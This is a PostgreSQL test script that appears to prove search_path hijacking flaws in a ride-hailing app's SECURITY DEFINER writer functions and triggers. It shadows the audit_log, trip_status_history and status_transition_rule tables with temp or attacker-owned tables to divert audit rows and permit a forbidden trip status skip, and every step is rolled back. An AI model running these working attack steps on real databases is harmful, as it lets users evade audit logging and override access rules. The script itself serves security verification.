-- FOLLOW UP 2, proof 1b: search path attacks on the SECURITY DEFINER writers (and on the invoker triggers).
-- Each SESSION is run as its own psql connection (so no cached plan from an earlier session hides the effect),
-- inside BEGIN ... ROLLBACK, as ridehail_app (SET ROLE), with current_user printed.
-- The writers are fixed with SET search_path = pg_catalog, public. pg_temp is NOT listed in that path.
-- PostgreSQL searches the temporary schema FIRST for tables unless pg_temp is named explicitly in the path.
\set SHOW_CONTEXT always

-- SESSION 1
\echo '################ E1: ridehail_app creates a TEMP table named audit_log and lets the writer insert into it (payment status change)'
BEGIN;
SET ROLE ridehail_app;
SELECT current_user, session_user;
CREATE TEMP TABLE audit_log (LIKE public.audit_log INCLUDING DEFAULTS);
GRANT INSERT ON pg_temp.audit_log TO ridehail_writer;
SELECT set_config('app.actor_role', 'provider', true), set_config('app.actor_id', '', true);
SELECT count(*) AS public_audit_rows_for_payment_before FROM public.audit_log WHERE entity_type = 'payment' AND entity_id = (SELECT id FROM public.payment WHERE provider_reference = 'PRV-T03-A');
UPDATE public.payment SET status = 'succeeded', paid_at = now() WHERE provider_reference = 'PRV-T03-A' RETURNING provider_reference, status;
SELECT count(*) AS public_audit_rows_for_payment_after FROM public.audit_log WHERE entity_type = 'payment' AND entity_id = (SELECT id FROM public.payment WHERE provider_reference = 'PRV-T03-A');
SELECT count(*) AS rows_that_went_into_the_temp_table FROM pg_temp.audit_log;
ROLLBACK;

-- SESSION 2
\echo '################ E2: a TEMP table named trip_status_history (trip move by driver 3 on trip 10)'
BEGIN;
SET ROLE ridehail_app;
SELECT current_user, session_user;
CREATE TEMP TABLE trip_status_history (LIKE public.trip_status_history INCLUDING DEFAULTS);
ALTER TABLE pg_temp.trip_status_history ALTER COLUMN seq SET DEFAULT 1;  -- the attacker gives its table a seq default so the writer is not stopped by a NOT NULL error
GRANT INSERT ON pg_temp.trip_status_history TO ridehail_writer;
SELECT set_config('app.actor_role', 'driver', true), set_config('app.actor_id', 'bbbbbbbb-0000-0000-0000-000000000003', true);
SELECT count(*) AS public_history_rows_before FROM public.trip_status_history WHERE trip_id = 'eeeeeeee-0000-0000-0000-000000000010';
UPDATE public.trip SET status = 'arrived' WHERE id = 'eeeeeeee-0000-0000-0000-000000000010' RETURNING id, status;
SELECT count(*) AS public_history_rows_after FROM public.trip_status_history WHERE trip_id = 'eeeeeeee-0000-0000-0000-000000000010';
SELECT count(*) AS rows_that_went_into_the_temp_table FROM pg_temp.trip_status_history;
ROLLBACK;

-- SESSION 3
\echo '################ E3: an attacker role that owns a schema earlier on the search path (attack_s) with its own audit_log and trip_status_history'
BEGIN;
CREATE ROLE attacker_proof NOLOGIN;
CREATE SCHEMA attack_s AUTHORIZATION attacker_proof;
GRANT USAGE ON SCHEMA attack_s TO ridehail_app;
SET ROLE attacker_proof;
SELECT current_user AS attacker_is, session_user;
CREATE TABLE attack_s.audit_log (id uuid DEFAULT gen_random_uuid(), actor_role text, actor_rider_id uuid, actor_driver_id uuid, actor_admin_id uuid, action text, entity_type text, entity_id uuid, note text, details jsonb, created_at timestamptz DEFAULT now(), updated_at timestamptz DEFAULT now());
CREATE TABLE attack_s.trip_status_history (id uuid DEFAULT gen_random_uuid(), trip_id uuid, from_status text, to_status text, actor_role text, actor_rider_id uuid, actor_driver_id uuid, actor_admin_id uuid, created_at timestamptz DEFAULT now(), updated_at timestamptz DEFAULT now(), seq bigserial);
GRANT INSERT, SELECT ON attack_s.audit_log, attack_s.trip_status_history TO PUBLIC;
RESET ROLE;
SET ROLE ridehail_app;
SELECT current_user, session_user;
SET search_path = attack_s, public;
SHOW search_path;
SELECT set_config('app.actor_role', 'provider', true), set_config('app.actor_id', '', true);
UPDATE public.payment SET status = 'succeeded', paid_at = now() WHERE provider_reference = 'PRV-T03-A' RETURNING provider_reference, status;
SELECT set_config('app.actor_role', 'driver', true), set_config('app.actor_id', 'bbbbbbbb-0000-0000-0000-000000000003', true);
UPDATE public.trip SET status = 'arrived' WHERE id = 'eeeeeeee-0000-0000-0000-000000000010' RETURNING id, status;
SELECT (SELECT count(*) FROM public.audit_log WHERE entity_type = 'payment' AND entity_id = (SELECT id FROM public.payment WHERE provider_reference = 'PRV-T03-A')) AS rows_in_public_audit_log_for_payment,
       (SELECT count(*) FROM attack_s.audit_log) AS rows_in_attacker_audit_log,
       (SELECT count(*) FROM public.trip_status_history WHERE trip_id = 'eeeeeeee-0000-0000-0000-000000000010') AS rows_in_public_history_for_trip_10,
       (SELECT count(*) FROM attack_s.trip_status_history) AS rows_in_attacker_history;
ROLLBACK;

-- SESSION 4
\echo '################ E4: the NON-definer triggers: a TEMP table named status_transition_rule allows a skipped move (assigned > started by driver 3)'
BEGIN;
SET ROLE ridehail_app;
SELECT current_user, session_user;
CREATE TEMP TABLE status_transition_rule (entity text, from_status text, to_status text, actor_role text);
INSERT INTO pg_temp.status_transition_rule VALUES ('trip', 'assigned', 'started', 'driver');
SELECT set_config('app.actor_role', 'driver', true), set_config('app.actor_id', 'bbbbbbbb-0000-0000-0000-000000000003', true);
UPDATE public.trip SET status = 'started' WHERE id = 'eeeeeeee-0000-0000-0000-000000000010' RETURNING id, status, started_at IS NOT NULL AS has_started_at;
ROLLBACK;
\echo '--- control: the same skipped move WITHOUT the temp table is refused'
BEGIN;
SET ROLE ridehail_app;
SELECT current_user, session_user;
SELECT set_config('app.actor_role', 'driver', true), set_config('app.actor_id', 'bbbbbbbb-0000-0000-0000-000000000003', true);
UPDATE public.trip SET status = 'started' WHERE id = 'eeeeeeee-0000-0000-0000-000000000010' RETURNING id, status;
ROLLBACK;
